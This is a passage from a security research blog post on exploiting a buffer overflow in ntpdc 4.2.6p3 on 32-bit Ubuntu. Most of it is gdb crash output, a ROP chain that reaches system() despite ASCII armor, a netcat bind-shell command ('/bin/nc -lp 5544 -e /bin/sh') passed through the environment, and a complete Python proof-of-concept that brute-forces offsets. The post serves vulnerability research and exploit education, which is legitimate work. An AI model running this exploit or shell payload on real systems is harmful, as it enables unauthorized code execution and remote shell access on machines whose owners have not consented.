</span><span class='line'>$ python -c "print 'A'*485 + '\xe0\x43\x01\x80' + 'A'*79 + '\x8d\x67\x02\x80' + 'B'*600" &gt; input.file
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0x41414141 ('AAAA')
</span><span class='line'>ECX: 0x13560 
</span><span class='line'>EDX: 0x42424242 ('BBBB')
</span><span class='line'>ESI: 0x41414141 ('AAAA')
</span><span class='line'>EDI: 0x41414141 ('AAAA')
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbffff3bc ("BBBB")
</span><span class='line'>EIP: 0x41414141 ('AAAA')
</span><span class='line'>EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41414141
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3bc ("BBBB")
</span><span class='line'>0004| 0xbffff3c0 --&gt; 0x4e495700 ('')
</span><span class='line'>0008| 0xbffff3c4 ("DOWID=69206020")
</span><span class='line'>0012| 0xbffff3c8 ("D=69206020")
</span><span class='line'>0016| 0xbffff3cc ("206020")
</span><span class='line'>0020| 0xbffff3d0 --&gt; 0x47003032 ('20')
</span><span class='line'>0024| 0xbffff3d4 ("NOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
</span><span class='line'>0028| 0xbffff3d8 ("_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>This gives us EIP, control over the stack, and control over a decent number of registers; however, the LD_PRELOAD trick is extremely sensitive to stack shifting which represents a pretty big problem for exploit portability.  For now, I&rsquo;m going to forget about it; chances are we could brute force the offset, if necessary, or simply invoke the application with <code>env -i</code>.</p>

<p>From here, we need to figure out a ROP payload.  The easiest payload I can think of is a simple ret2libc.  Unfortunately, ASCII armor null bytes all of them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ vmmap
</span><span class='line'>
</span><span class='line'>0x00327000 0x004cb000 r-xp /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>0x004cb000 0x004cd000 r--p /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>0x004cd000 0x004ce000 rw-p /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0x366060 &lt;system&gt;
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>One idea I had was to simply construct the address in memory, then call it.  Using <a href="http://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>, I hunted for ADD/SUB instructions that modified any registers we controlled.  Eventually, I discovered this gem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x800138f2: add edi, esi; ret 0;
</span><span class='line'>0x80022073: call edi</span></code></pre></td></tr></table></div></figure>


<p>Using the above, we could pop controlled, non-null values into EDI/ESI, that when added equaled <code>0x366060 &lt;system&gt;</code>.  Many values will work, but I chose <code>0xeeffffff + 0x11366061</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0x41414141 ('AAAA')
</span><span class='line'>ECX: 0x12f00 
</span><span class='line'>EDX: 0x42424242 ('BBBB')
</span><span class='line'>ESI: 0xeeffffff 
</span><span class='line'>EDI: 0x11366061 
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
</span><span class='line'>EIP: 0x800143ea (ret)
</span><span class='line'>EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x800143e7: pop    esi
</span><span class='line'>   0x800143e8: pop    edi
</span><span class='line'>   0x800143e9: pop    ebp
</span><span class='line'>=&gt; 0x800143ea: ret    
</span><span class='line'>   0x800143eb: nop
</span><span class='line'>   0x800143ec: lea    esi,[esi+eiz*1+0x0]
</span><span class='line'>   0x800143f0: mov    DWORD PTR [esp],ebp
</span><span class='line'>   0x800143f3: call   0x80018d20
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
</span><span class='line'>0004| 0xbfffefbc --&gt; 0x80022073 --&gt; 0xd7ff 
</span><span class='line'>0008| 0xbfffefc0 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0012| 0xbfffefc4 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0016| 0xbfffefc8 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0020| 0xbfffefcc ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0024| 0xbfffefd0 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbfffefd4 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>0x800143ea in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>As shown above, we&rsquo;ve got our two values in EDI/ESI and are returning to our <code>ADD EDI, ESI</code> gadget.  Once this completes, we return to our <code>CALL EDI</code> gadget, which will jump into <code>system</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EDI: 0x366060 (&lt;system&gt;:   sub    esp,0x1c)
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbfffefc0 --&gt; 0xbffff60d ("/bin/nc -lp 5544 -e /bin/sh")
</span><span class='line'>EIP: 0x80022073 --&gt; 0xd7ff
</span><span class='line'>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>=&gt; 0x80022073: call   edi</span></code></pre></td></tr></table></div></figure>


<p>Recall the format of a ret2libc: <code>[system() address | exit() | shell command]</code>; therefore, we need to stick a bogus <code>exit</code> address (in my case, junk) as well as the address of a command.  Also remember, however, that <code>CALL EDI</code> is essentially a macro for <code>PUSH EIP+2 ; JMP EDI</code>.  This means that our stack will be tainted with the address @ EIP+2.  Thanks to this, we don&rsquo;t really need to add an exit address, as one will be added for us.  There are, unfortunately, no <code>JMP EDI</code> gadgets in the binary, so we&rsquo;re stuck with a messy exit.</p>

<p>This culminates in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*8472 + "\xff\xff\xff\xee" + "\x61\x60\x36\x11" + "AAAA" + "\xf2\x38\x01\x80" + "\x73\x20\x02\x80" + "\x0d\xf6\xff\xbf" + "C"*1492'`
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>[snip all the LD_PRELOAD crap]
</span><span class='line'>[New process 31184]
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
</span><span class='line'>process 31184 is executing new program: /bin/dash
</span><span class='line'>[New process 31185]
</span><span class='line'>process 31185 is executing new program: /bin/nc.traditional</span></code></pre></td></tr></table></div></figure>


<p>Success!  Though this is a very dirty hack, and makes no claim of portability, it works.  As noted previously, we can brute force the image base and stack offsets, though we can also execute the binary with an empty environment and no stack tampering with <code>env -i</code>, giving us a much higher chance of hitting our mark.</p>

<p>Overall, this was quite a bit of fun.  Although ASLR/PIE still poses an issue, this is a local bug that brute forcing and a little investigation can&rsquo;t take care of.  NX/RELRO/Canary/SSP/ASCII Armor have all been successfully neutralized.  I hacked up a PoC that <em>should</em> work on Ubuntu boxes as configured, but it brute forces offsets.  Test runs show it can take up to 2 hours to successfully pop a box.  Full code can be found below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from os import system, environ
</span><span class='line'>from struct import pack
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># ntpdc 4.2.6p3 bof
</span><span class='line'># @dronesec
</span><span class='line'># tested on x86 Ubuntu 12.04.5 LTS
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>IMAGE_BASE = 0x80000000
</span><span class='line'>LD_INITIAL_OFFSET = 8900
</span><span class='line'>LD_TAIL_OFFSET = 1400
</span><span class='line'>
</span><span class='line'>sploit = "\x41" * 485        # junk 
</span><span class='line'>sploit += pack("&lt;I", IMAGE_BASE + 0x000143e0) # eip
</span><span class='line'>sploit += "\x41" * 79        # junk 
</span><span class='line'>sploit += pack("&lt;I", IMAGE_BASE + 0x0002678d) # location -0x14/-0x318 from shellcode
</span><span class='line'>
</span><span class='line'>ld_pl = ""
</span><span class='line'>ld_pl += pack("&lt;I", 0xeeffffff) # ESI
</span><span class='line'>ld_pl += pack("&lt;I", 0x11366061) # EDI
</span><span class='line'>ld_pl += pack("&lt;I", 0x41414141) # EBP
</span><span class='line'>ld_pl += pack("&lt;I", IMAGE_BASE + 0x000138f2) # ADD EDI, ESI; RET
</span><span class='line'>ld_pl += pack("&lt;I", IMAGE_BASE + 0x00022073) # CALL EDI
</span><span class='line'>ld_pl += pack("&lt;I", 0xbffff60d) # payload addr based on empty env; probably wrong
</span><span class='line'>
</span><span class='line'>environ["EGG"] = "/bin/nc -lp 5544 -e /bin/sh"
</span><span class='line'>
</span><span class='line'>for idx in xrange(200):
</span><span class='line'>
</span><span class='line'>    for inc in xrange(200):
</span><span class='line'>
</span><span class='line'>        ld_pl = ld_pl + "\x41" * (LD_INITIAL_OFFSET + idx)
</span><span class='line'>        ld_pl += "\x43" * (LD_INITIAL_OFFSET + inc)
</span><span class='line'>
</span><span class='line'>        environ["LD_PRELOAD"] = ld_pl
</span><span class='line'>        system("echo %s | ntpdc 2&gt;&1" % sploit)</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>

      








  


<time datetime="2015-01-06T13:10:04-08:00" pubdate data-updated="true">Jan 6<span>th</span>, 2015</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/ntpdc/'>ntpdc</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit/" data-via="" data-counturl="http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/08/27/railo-security-part-four/" title="Previous Post: railo security - part four - pre-auth remote code execution">&laquo; railo security - part four - pre-auth remote code execution</a>
      
      
        <a class="basic-alignment right" href="/blog/2017/09/01/abusing-token-privileges-for-eop/" title="Next Post: Abusing Token Privileges for EoP">Abusing Token Privileges for EoP &raquo;</a>
      
    </p>
  </footer>
</article>


</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2020/08/07/digging-the-adobe-sandbox-internals/">Digging the Adobe Sandbox - IPC Internals</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/08/12/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/08/22/dell-digital-delivery-eop/">Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2020 - Bryan Alexander -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
</p>

</footer>
  










  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
